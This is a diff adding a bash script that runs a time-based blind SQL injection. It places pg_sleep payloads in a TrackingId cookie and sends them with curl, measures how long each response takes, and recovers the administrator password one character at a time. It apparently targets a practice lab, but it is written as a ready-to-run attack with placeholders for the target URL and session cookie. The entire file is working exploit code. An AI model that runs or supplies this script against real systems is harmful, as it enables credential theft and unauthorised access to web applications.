@@ -1,0 +1,55 @@
+#!/bin/bash
+
+# --- Configuration ---
+URL="YOUR_URL"
+SESSION_COOKIE="YOUR_SESSION_COOKIE" # IMPORTANT: Replace with your actual session cookie value
+# Characters to try for the password.
+CHARSET="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+MAX_PASSWORD_LENGTH=20
+
+# --- Script Logic ---
+echo "Starting blind SQL injection attack..."
+echo "Target URL: ${URL}"
+
+DISCOVERED_PASSWORD=""
+POSITION=1
+
+while [ ${POSITION} -le ${MAX_PASSWORD_LENGTH} ]; do
+    FOUND_CHAR=""
+    echo -n "Trying character for position ${POSITION}: "
+
+    for GUESS_CHAR in $(echo "${CHARSET}" | grep -o .); do
+        # Construct the TrackingId payload
+        # The ' -- -' at the end comments out the rest of the SQL query
+        TRACKING_ID_PAYLOAD="COOKIE_TRACKING_ID'%3b select case when (username='administrator' and substr(password,${POSITION},1)='${GUESS_CHAR}') then pg_sleep(5) else pg_sleep(0) end from users-- -'"
+
+        # Perform the curl request silently (-s)
+        # -b sends the cookies
+        # -o /dev/null hides the output
+        # total time is printed. If greater than 4 seconds, the value is correct
+        RESPONSE=$(curl -s -w 'Total: %{time_total}\n' -b "session=${SESSION_COOKIE}; TrackingId=${TRACKING_ID_PAYLOAD}" "${URL}" -o /dev/null) 
+        # Check if the success message is in the response
+        if echo "${RESPONSE}" | awk '{gsub(/s/, "", $2); if ($2 > 4.0) print "true"; else print "false"}' | grep -q "true"; then
+            FOUND_CHAR="${GUESS_CHAR}"
+            DISCOVERED_PASSWORD="${DISCOVERED_PASSWORD}${FOUND_CHAR}"
+            echo "${FOUND_CHAR} (Found!)"
+            break # Move to the next position
+        fi
+        echo -n "${GUESS_CHAR}" # Show progress
+    done
+
+    if [ -z "${FOUND_CHAR}" ]; then
+        echo -e "\nNo character found for position ${POSITION}. Assuming end of password or character not in CHARSET."
+        break # No character found for this position, likely end of password
+    fi
+
+    POSITION=$((POSITION + 1))
+done
+
+echo -e "\n--- Attack Complete ---"
+if [ -n "${DISCOVERED_PASSWORD}" ]; then
+    echo "Discovered password: ${DISCOVERED_PASSWORD}"
+else
+    echo "Could not discover the password."
+fi
+
